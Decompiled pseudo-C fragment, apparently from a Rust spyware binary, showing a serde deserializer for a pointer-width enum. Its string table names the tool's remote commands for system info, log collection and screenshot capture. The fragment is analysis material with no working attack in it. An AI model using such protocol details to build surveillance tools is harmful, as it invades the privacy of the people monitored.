long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::PointerWidth>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_enum(a1, "PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widthGetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 12);
    return a0;
}
